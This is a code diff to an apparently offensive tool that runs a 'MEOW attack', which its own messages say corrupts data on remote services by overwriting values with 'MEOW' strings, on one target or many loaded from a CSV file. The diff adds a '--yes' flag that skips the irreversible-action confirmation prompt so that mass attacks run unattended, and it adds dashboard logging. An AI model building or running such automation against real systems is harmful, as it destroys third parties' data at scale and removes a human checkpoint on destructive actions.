@@ -64,6 +64,8 @@ Examples:
                         help='Password for authentication')
     parser.add_argument('-v', '--verbose', action='store_true',
                         help='Enable verbose output')
+    parser.add_argument('-y', '--yes', action='store_true',
+                        help='Skip confirmation prompt (non-interactive, for automation)')
     
     return parser.parse_args()
 
@@ -202,7 +204,10 @@ def main():
     # Set up logging
     log_level = logging.DEBUG if args.verbose else logging.INFO
     logger = setup_logging(log_level)
-    
+
+    from dashboard.event_emitter import attach_dashboard_logging
+    attach_dashboard_logging(logger_name=logger.name)
+
     try:
         # List supported services
         if args.list:
@@ -229,11 +234,12 @@ def main():
             print(f"\n[+] Loaded {len(targets)} target(s) from CSV file")
             print("[+] This will corrupt data by replacing values with 'MEOW' strings")
 
-            # Confirm before proceeding
-            confirm = input(f"\n[?] Are you sure you want to attack {len(targets)} target(s)? This operation cannot be undone [y/N]: ")
-            if confirm.lower() not in ('y', 'yes'):
-                print("\n[!] Attack aborted by user")
-                return 0
+            # Confirm before proceeding (skipped with --yes)
+            if not args.yes:
+                confirm = input(f"\n[?] Are you sure you want to attack {len(targets)} target(s)? This operation cannot be undone [y/N]: ")
+                if confirm.lower() not in ('y', 'yes'):
+                    print("\n[!] Attack aborted by user")
+                    return 0
 
             # Process each target in the CSV
             total_stats = {
@@ -320,11 +326,12 @@ def main():
             print(f"\n[+] Starting MEOW attack on {args.service} at {args.target}")
             print("[+] This will corrupt data by replacing values with 'MEOW' strings")
 
-            # Confirm before proceeding
-            confirm = input("\n[?] Are you sure you want to continue? This operation cannot be undone [y/N]: ")
-            if confirm.lower() not in ('y', 'yes'):
-                print("\n[!] Attack aborted by user")
-                return 0
+            # Confirm before proceeding (skipped with --yes)
+            if not args.yes:
+                confirm = input("\n[?] Are you sure you want to continue? This operation cannot be undone [y/N]: ")
+                if confirm.lower() not in ('y', 'yes'):
+                    print("\n[!] Attack aborted by user")
+                    return 0
 
             # Execute the attack
             print("\n[+] Executing MEOW attack...")
